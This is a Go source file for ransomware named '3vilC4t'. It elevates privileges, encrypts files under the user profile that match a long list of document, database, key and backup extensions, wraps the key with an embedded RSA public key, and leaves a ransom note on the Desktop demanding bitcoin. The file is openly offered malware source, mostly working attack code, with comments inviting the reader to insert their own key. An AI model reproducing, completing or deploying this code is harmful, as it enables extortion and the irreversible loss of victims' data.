package main

import (
	"crypto/rand"
	b64 "encoding/base64"
	"fmt"
	"os"
)

// Encryption key needs to be a global so we can reference it in the frontend
var EncryptionKey []byte

var ransomNoteMsg string = `                                                                                
                                                     ,,                         
                       ,,,                          ,,,,,,                      
                    ,,, ,,                        ,,,    ,,,,                   
                 ,,,,    ,,                      ,,       ,,,,,,                
               ,,,,       ,,                    ,,          ,,,,,,              
             ,,,,          ,,                 .,             ,,,,,,             
           ,,,,,             ,,              ,,               ,,,,,,,           
          ,,,,,                ,,           ,                                   
         ,,,,,                                                                  
                                                ,,,                             
                    ,,,,,,,,                ,,,,,,,,,,,                         
                   ,,,,,,,,,,*             ,,,,,,,,,,,,,                        
                   ,,,,,,,,,,.             ,,,,,,,,,,,,,&                       
         ,,         ,,,,,,,,                *,,,,,,,,,,,         ,              
        ,.                                     (,,,,              ,             
        ,,                                                      .,,             
        ,,,,                                                  ,, ,,             
           ,,,,, ,,,,,                          .,     ,,,, ,, .,               
            , ,,,,,,,, , ,,,,,, ,,,,,  ,,,,   ,,,,,,.,, ,,.,,,,                 
               ,,, ,, ,,,,,,,,, ,,,, ,, ,,, ,, ,,,, ,,,, ,                      
                   . ,,,,,,,,,,, ,, ,,,,,,,,,,  ,, ,,,,,                        
                           ,,,,,, .,,,,, ,,,,,,                                 

	▓█████ ██▒   █▓ ██▓ ██▓        ▄████▄   ▄▄▄     ▄▄▄█████▓
	▓█   ▀▓██░   █▒▓██▒▓██▒       ▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒
	▒███   ▓██  █▒░▒██▒▒██░       ▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░
	▒▓█  ▄  ▒██ █░░░██░▒██░       ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ 
	░▒████▒  ▒▀█░  ░██░░██████▒   ▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ 
	░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░   ░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   
	░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░     ░  ▒     ▒   ▒▒ ░   ░    
		░       ░░   ▒ ░  ░ ░      ░          ░   ▒    ░      
		░  ░     ░   ░      ░  ░   ░ ░            ░  ░        
				░                  ░                          

You have been infected by 3vilC4t virus. All your files have been encrypted. Do not attempt to decrypt the files on your own. It will cause irreversible damage.
DO NOT DELETE THIS FILE. If this file is deleted, your files will be double encrypted. At that point, recovering your files will be impossible. In order to recieve
the key to decrypt your files, you must pay 0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf (This is a fake address.) Add a contact method to the description of
the transaction as well as the KeyID, and a key will be sent to that contact. There are numerous guides on how to purchase bitcoin online. Good luck.				
`

func isFirstTime() bool {
	cookie := os.Getenv("USERPROFLE") + "\\Desktop\\" + "README.PWN"
	if _, err := os.Stat(cookie); os.IsNotExist(err) {
		return true
	}
	return false
}

func getEncryptedKey() string {
	var result string
	result = b64.StdEncoding.EncodeToString(EncryptionKey)
	return result
}

func b64DecodeEncryptionKey(key []byte) string {
	sEnc := b64.StdEncoding.EncodeToString(key)
	return sEnc
}

func initialize() {

	// Only proceed if it is the first time. Encrypting the same files multiple times would be bad.
	if !isFirstTime() {
		return
	}

	// Need to check if we are an admin first. If we are not, re-run as admin, and close out this process.
	if !AmAdmin() {
		fmt.Println("Elevating Privileges...")
		ElevateMe()
	}

	// Add your own public key here. Make sure there are no tabs or whitespace.
	// This example key was generated with the rsa.GenerateKey() function.
	const pubPEM = `
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcMcLEUzBFFsNGaTW80d
obhQIGiieuP9C+h/SLx/WGFhwFYBDp5mk6ywwejwVDBr+6ulUXISabEKnOerqo4u
09wussaLmA0fje1Kipil9Fr9exRQ3oFQxdjcEvraCj7u/WEeu0w1Mg+d/AN8d6Zl
POzkS5l+cv4RnjKEiyGnVdrBUtuNKK2dEsexCjjMHn7XJp16Msc9gt6AneK40Nog
Y8MW5yRjXMBpAanA688h9HvA0CewXNju5V0ouS+dHCPWDTHX41Erv72rsDQiz7Vq
OpRDAU7mi2Xgt+njdHcDtZleaZiwIhbDo8SR6LVFossHsNCCoA0nLS9wp8qPwxEH
gwIDAQAB
-----END PUBLIC KEY-----`

	// Only encrypt files that contain these extensions.
	targets := []string{".wb2", ".psd", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".pl", ".py", ".lua", ".css", ".js", ".asp", ".php", ".incpas", ".asm", ".hpp", ".h", ".cpp", ".c", ".7z", ".zip", ".rar", ".drf", ".blend", ".apj", ".3ds", ".dwg", ".sda", ".ps", ".pat", ".fxg", ".fhd", ".fh", ".dxb", ".drw", ".design", ".ddrw", ".ddoc", ".dcs", ".csl", ".csh", ".cpi", ".cgm", ".cdx", ".cdrw", ".cdr6", ".cdr5", ".cdr4", ".cdr3", ".cdr", ".awg", ".ait", ".ai", ".agd1", ".ycbcra", ".x3f", ".stx", ".st8", ".st7", ".st6", ".st5", ".st4", ".srw", ".srf", ".sr2", ".sd1", ".sd0", ".rwz", ".rwl", ".rw2", ".raw", ".raf", ".ra2", ".ptx", ".pef", ".pcd", ".orf", ".nwb", ".nrw", ".nop", ".nef", ".ndd", ".mrw", ".mos", ".mfw", ".mef", ".mdc", ".kdc", ".kc2", ".iiq", ".gry", ".grey", ".gray", ".fpx", ".fff", ".exf", ".erf", ".dng", ".dcr", ".dc2", ".crw", ".craw", ".cr2", ".cmt", ".cib", ".ce2", ".ce1", ".arw", ".3pr", ".3fr", ".mpg", ".jpeg", ".jpg", ".mdb", ".sqlitedb", ".sqlite3", ".sqlite", ".sql", ".sdf", ".sav", ".sas7bdat", ".s3db", ".rdb", ".psafe3", ".nyf", ".nx2", ".nx1", ".nsh", ".nsg", ".nsf", ".nsd", ".ns4", ".ns3", ".ns2", ".myd", ".kpdx", ".kdbx", ".idx", ".ibz", ".ibd", ".fdb", ".erbsql", ".db3", ".dbf", ".db-journal", ".db", ".cls", ".bdb", ".al", ".adb", ".backupdb", ".bik", ".backup", ".bak", ".bkp", ".moneywell", ".mmw", ".ibank", ".hbk", ".ffd", ".dgc", ".ddd", ".dac", ".cfp", ".cdf", ".bpw", ".bgt", ".acr", ".ac2", ".ab4", ".djvu", ".pdf", ".sxm", ".odf", ".std", ".sxd", ".otg", ".sti", ".sxi", ".otp", ".odg", ".odp", ".stc", ".sxc", ".ots", ".ods", ".sxg", ".stw", ".sxw", ".odm", ".oth", ".ott", ".odt", ".odb", ".csv", ".rtf", ".accdr", ".accdt", ".accde", ".accdb", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".potm", ".potx", ".pptm", ".pptx", ".pps", ".pot", ".ppt", ".xlw", ".xll", ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt", ".xls", ".xml", ".dotm", ".dotx", ".docm", ".docx", ".dot", ".doc", ".txt"}

	publicRSAKey := savePublicKey(pubPEM)
	EncryptionKey = make([]byte, 32)
	_, err := rand.Read(EncryptionKey)
	checkError(err)

	// Change the root directory. Only used this for testing.
	files := EncryptSystem(os.Getenv("USERPROFILE"), targets, EncryptionKey)

	// Encrypt the key so that it can't be reversed.
	EncryptionKey = EncryptDataRSA(publicRSAKey, EncryptionKey)
	ransomBytes := []byte(ransomNoteMsg + getEncryptedKey())
	WriteToFile(os.Getenv("USERPROFILE")+"\\DESKTOP\\README.PWN", ransomBytes)

	// Append the key
	for _, f := range files {
		fmt.Println(f)
	}
}
